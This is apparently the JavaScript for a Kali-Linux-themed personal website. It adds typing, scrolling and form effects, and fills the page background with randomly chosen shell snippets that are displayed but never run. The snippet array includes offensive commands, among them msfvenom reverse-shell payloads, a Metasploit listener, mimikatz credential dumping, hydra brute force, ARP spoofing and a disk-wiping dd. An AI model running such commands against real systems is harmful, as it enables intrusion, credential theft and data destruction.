// JavaScript 文件 - 为 KALI Linux 风格个人网页添加交互效果

// DOM 元素加载完成后执行
document.addEventListener('DOMContentLoaded', function() {
    // 生成代码背景
    generateCodeBackground();
    
    // 终端打字效果
    terminalTypeEffect();
    
    // 平滑滚动
    smoothScroll();
    
    // 滚动动画
    scrollAnimation();
    
    // 表单提交处理
    formSubmitHandler();
});

// 生成代码背景
function generateCodeBackground() {
    const codeBg = document.getElementById('code-bg');
    const codeSnippets = [
        '#!/bin/bash',
        'echo "Welcome to KALI Linux"',
        'nmap -sP 192.168.1.0/24',
        'msfconsole',
        'search exploit',
        'use exploit/multi/handler',
        'set payload windows/meterpreter/reverse_tcp',
        'set LHOST 192.168.1.100',
        'set LPORT 4444',
        'exploit',
        'python3 -c "print(\'Hello, World!\')"',
        'import requests',
        'response = requests.get(\'https://api.example.com\')',
        'print(response.json())',
        'public class HelloWorld {',
        '    public static void main(String[] args) {',
        '        System.out.println("Hello, World!");',
        '    }',
        '}',
        'using System;',
        'namespace HelloWorld {',
        '    class Program {',
        '        static void Main(string[] args) {',
        '            Console.WriteLine("Hello, World!");',
        '        }',
        '    }',
        '}',
        '<!DOCTYPE html>',
        '<html>',
        '<head>',
        '    <title>Page Title</title>',
        '</head>',
        '<body>',
        '    <h1>Hello, World!</h1>',
        '</body>',
        '</html>',
        '$ nc -lvnp 4444',
        '$ cat /etc/passwd',
        '$ sudo apt-get update',
        '$ sudo apt-get install kali-linux-full',
        '$ service apache2 start',
        '$ mysql -u root -p',
        '> show databases;',
        '> use database_name;',
        '> select * from users;',
        'function exploit() {',
        '    const buffer = "A".repeat(1000);',
        '    send_payload(buffer);',
        '}',
        'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt',
        'airmon-ng start wlan0',
        'airodump-ng wlan0mon',
        'arpspoof -i eth0 -t 192.168.1.1 192.168.1.100',
        'tcpdump -i eth0 -w capture.pcap',
        'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
        'hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh',
        'dirb http://example.com /usr/share/wordlists/dirb/common.txt',
        'sqlmap -u "http://example.com/index.php?id=1" --dbs',
        'wireshark',
        'netstat -tuln',
        'ps aux | grep root',
        'find / -perm -4000 -type f 2>/dev/null',
        'chmod +x script.sh',
        './script.sh',
        'ping -c 4 google.com',
        'traceroute google.com',
        'ifconfig',
        'ip addr show',
        'dig google.com',
        'whois example.com',
        'curl ifconfig.me',
        'wget https://example.com/file.zip',
        'unzip file.zip',
        'tar -xzvf file.tar.gz',
        'grep -r "password" /var/www/html/',
        'cat access.log | grep 404',
        'ls -la | sort -k5 -n -r',
        'du -sh * | sort -h',
        'df -h',
        'free -m',
        'top',
        'htop',
        'kill -9 PID',
        'systemctl status apache2',
        'journalctl -xe',
        'iptables -L -n',
        'ufw status',
        'sudo su -',
        'passwd user',
        'adduser newuser',
        'usermod -aG sudo newuser',
        'ssh-keygen -t rsa -b 4096',
        'scp file.txt user@remote:/path/to/destination',
        'rsync -avz /source/ user@remote:/destination/',
        'git clone https://github.com/user/repo.git',
        'git add .',
        'git commit -m "Commit message"',
        'git push origin master',
        'docker pull ubuntu',
        'docker run -it ubuntu /bin/bash',
        'docker ps -a',
        'docker-compose up -d',
        'terraform init',
        'terraform apply',
        'ansible-playbook deploy.yml',
        'kubectl get pods',
        'helm install myapp ./chart',
        'curl -X GET http://api.example.com/users',
        'curl -X POST -H "Content-Type: application/json" -d \'{"name":"John","email":"john@example.com"}\' http://api.example.com/users',
        'python -m http.server 8000',
        'node server.js',
        'npm install',
        'npm run start',
        'pip install requests',
        'pip freeze > requirements.txt',
        'virtualenv venv',
        'source venv/bin/activate',
        'java -jar app.jar',
        'mvn clean install',
        'dotnet run',
        'gcc -o hello hello.c',
        './hello',
        'make',
        'make install',
        'vim file.txt',
        'nano file.txt',
        'emacs file.txt',
        'cat > file.txt << EOF',
        'Content here',
        'EOF',
        'sed -i \'s/old/new/g\' file.txt',
        'awk \'{print $1}\' file.txt',
        'cut -d "," -f 2 file.csv',
        'sort file.txt',
        'uniq file.txt',
        'grep -v "pattern" file.txt',
        'head -n 10 file.txt',
        'tail -n 10 file.txt',
        'tail -f log.txt',
        'tee file.txt << EOF',
        'Content here',
        'EOF',
        'find . -name "*.txt"',
        'xargs -I {} rm -f {}',
        'base64 file.txt',
        'md5sum file.txt',
        'sha256sum file.txt',
        'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365',
        'file file.txt',
        'stat file.txt',
        'chown user:group file.txt',
        'chmod 755 file.txt',
        'ln -s /path/to/file link',
        'mount /dev/sdb1 /mnt',
        'umount /mnt',
        'dd if=/dev/zero of=/dev/sdb bs=1M',
        'fdisk /dev/sdb',
        'mkfs.ext4 /dev/sdb1',
        'partprobe',
        'lvm',
        'vgcreate vg0 /dev/sdb1',
        'lvcreate -n lv0 -l 100%FREE vg0',
        'mkfs.ext4 /dev/vg0/lv0',
        'swapon /dev/sdb1',
        'swapoff /dev/sdb1',
        'export PATH=$PATH:/new/path',
        'echo "export PATH=$PATH:/new/path" >> ~/.bashrc',
        'source ~/.bashrc',
        'alias ll="ls -la"',
        'history',
        '!100',
        'clear',
        'reset',
        'man command',
        'command --help',
        'which command',
        'whereis command',
        'whatis command',
        'apt-cache search package',
        'apt-cache show package',
        'dpkg -l | grep package',
        'dpkg -i package.deb',
        'apt-get remove package',
        'apt-get purge package',
        'apt-get autoremove',
        'apt-get autoclean',
        'updatedb',
        'locate file.txt',
        'find / -name "file.txt" 2>/dev/null',
        'time command',
        'screen',
        'tmux',
        'bg',
        'fg',
        'jobs',
        'disown -h %1',
        'nohup command &',
        'echo $$',
        'kill -SIGTERM PID',
        'killall process_name',
        'pkill process_name',
        'nice -n 10 command',
        'renice 10 PID',
        'ionice -c 3 command',
        'ulimit -a',
        'sysctl -a',
        'cat /proc/cpuinfo',
        'cat /proc/meminfo',
        'cat /proc/interrupts',
        'cat /proc/version',
        'uname -a',
        'lsb_release -a',
        'cat /etc/os-release',
        'date',
        'cal',
        'watch -n 1 "date && echo && ps aux | grep root"',
        'while true; do date; sleep 1; done',
        'for i in {1..10}; do echo $i; done',
        'echo "$PATH" | tr \':\' "\n"',
        'echo "Line 1\nLine 2\nLine 3" | wc -l',
        'echo "Hello" | base64',
        'echo "SGVsbG8=" | base64 -d',
        'ping -c 1 google.com | grep "time=" | cut -d "=" -f 4 | cut -d " " -f 1',
        'curl -s https://api.ipify.org',
        'wget -qO- https://api.ipify.org',
        'ip route | grep default | cut -d " " -f 3',
        'iwconfig',
        'iwlist scanning',
        'echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf > /dev/null',
        'host google.com',
        'nslookup google.com',
        'dig +short google.com',
        'tcpdump -i eth0 host 192.168.1.100 and port 80 -w capture.pcap',
        'tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri',
        'mitmdump -w traffic.log',
        'ngrep -d eth0 port 80',
        'sslstrip -a -k 443',
        'beef-xss',
        'ettercap -Tq -i eth0',
        'responder -I eth0',
        'mimikatz.exe "sekurlsa::logonPasswords" "exit"',
        'mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "exit"',
        'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe',
        'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 R > payload.apk',
        'msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php',
        'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf',
        'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"',
        'post/multi/gather/env',
        'post/multi/gather/find_vmx',
        'post/windows/gather/enum_logged_on_users',
        'post/windows/gather/hashdump',
        'post/windows/gather/smart_hashdump',
        'post/windows/manage/migrate',
        'post/windows/manage/persistence_exe',
        'run post/windows/gather/enum_applications',
        'run post/windows/gather/enum_computers',
        'run post/windows/gather/enum_domains',
        'run post/windows/gather/enum_patches',
        'run post/windows/gather/enum_processes',
        'run post/windows/gather/enum_services',
        'run post/windows/gather/enum_shares',
        'run post/windows/gather/enum_users',
        'run post/windows/manage/killav',
        'run post/windows/manage/mimikatz_command cmd="sekurlsa::logonPasswords"',
        'searchsploit windows 10',
        'searchsploit -m 42341',
        'exploitdb 42341',
        'metasploit-framework',
        'kali-linux-default',
        'kali-linux-large',
        'kali-linux-everything',
        'kali-linux-forensic',
        'kali-linux-gpu',
        'kali-linux-pwtools',
        'kali-linux-rfid',
        'kali-linux-sdr',
        'kali-linux-wireless',
        'kali-undercover',
        'kali-tweaks',
        'kali-history',
        'kali-config',
        'kali-grant-root',
        'kali-menu',
        'kali-archive-keyring',
        'kali-desktop-xfce',
        'kali-desktop-kde',
        'kali-desktop-gnome',
        'kali-desktop-mate',
        'kali-desktop-lxde',
        'kali-desktop-i3',
        'kali-desktop-sway',
        'kali-desktop-cinnamon',
        'kali-theme',
        'kali-wallpapers',
        'kali-community-wallpapers',
        'kali-bluetooth',
        'kali-docker',
        'kali-cloud',
        'kali-vm',
        'kali-wsl',
        'kali-arm',
        'kali-arm64',
        'kali-armhf',
        'kali-pi',
        'kali-pxe',
        'kali-live',
        'kali-installer',
        'kali-installer-netboot',
        'kali-installer-udebs',
        'kali-installer-menu',
        'kali-iso',
        'kali-rolling',
        'kali-dev',
        'kali-experimental',
        'kali-last-snapshot',
        'kali-current',
        'kali-bleeding-edge',
        'kali-security',
        'kali-updates',
        'kali-backports',
        'kali-proposed-updates',
        'deb http://http.kali.org/kali kali-rolling main non-free contrib',
        'deb-src http://http.kali.org/kali kali-rolling main non-free contrib',
        'sudo apt update && sudo apt full-upgrade -y',
        'sudo reboot',
        'sudo poweroff',
        'exit'
    ];
    
    // 随机生成多行代码
    let codeContent = '';
    for (let i = 0; i < 200; i++) {
        const randomSnippet = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
        codeContent += randomSnippet + '\n';
    }
    
    codeBg.textContent = codeContent;
}

// 终端打字效果
function terminalTypeEffect() {
    const terminalLines = document.querySelectorAll('.terminal-line');
    const delay = 50; // 每个字符的延迟时间
    
    terminalLines.forEach((line, lineIndex) => {
        const originalText = line.textContent;
        line.textContent = '';
        
        setTimeout(() => {
            let charIndex = 0;
            const typeInterval = setInterval(() => {
                if (charIndex < originalText.length) {
                    line.textContent += originalText.charAt(charIndex);
                    charIndex++;
                } else {
                    clearInterval(typeInterval);
                }
            }, delay);
        }, lineIndex * 500); // 每行之间的延迟
    });
}

// 平滑滚动
function smoothScroll() {
    const navLinks = document.querySelectorAll('nav a');
    
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            const targetId = this.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            
            window.scrollTo({
                top: targetElement.offsetTop - 80, // 考虑头部高度
                behavior: 'smooth'
            });
        });
    });
}

// 滚动动画
function scrollAnimation() {
    const animateElements = document.querySelectorAll('.skill-card, .project-card');
    
    function checkScroll() {
        animateElements.forEach(element => {
            const elementPosition = element.getBoundingClientRect().top;
            const windowHeight = window.innerHeight;
            
            if (elementPosition < windowHeight * 0.8) {
                element.style.opacity = '1';
                element.style.transform = 'translateY(0)';
            }
        });
    }
    
    // 初始设置
    animateElements.forEach(element => {
        element.style.opacity = '0';
        element.style.transform = 'translateY(20px)';
        element.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
    });
    
    // 监听滚动事件
    window.addEventListener('scroll', checkScroll);
    
    // 初始检查
    checkScroll();
}

// 表单提交处理
function formSubmitHandler() {
    const form = document.querySelector('form');
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // 获取表单数据
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const message = document.getElementById('message').value;
            
            // 简单验证
            if (name && email && message) {
                // 在实际应用中，这里应该有AJAX请求发送表单数据
                alert('感谢您的留言！我会尽快回复您。');
                form.reset();
            } else {
                alert('请填写所有必填字段。');
            }
        });
    }
}

// 添加窗口大小变化时重新生成代码背景
window.addEventListener('resize', function() {
    // 避免频繁调用
    clearTimeout(this.resizeTimeout);
    this.resizeTimeout = setTimeout(function() {
        generateCodeBackground();
    }, 500);
});

// 添加滚动进度指示器
window.addEventListener('scroll', function() {
    const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
    const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
    const scrolled = (winScroll / height) * 100;
    
    // 创建滚动指示器（如果不存在）
    if (!document.getElementById('scroll-indicator')) {
        const indicator = document.createElement('div');
        indicator.id = 'scroll-indicator';
        indicator.style.position = 'fixed';
        indicator.style.top = '0';
        indicator.style.left = '0';
        indicator.style.height = '3px';
        indicator.style.backgroundColor = 'var(--kali-green)';
        indicator.style.zIndex = '9999';
        indicator.style.width = '0%';
        document.body.appendChild(indicator);
    }
    
    document.getElementById('scroll-indicator').style.width = scrolled + '%';
});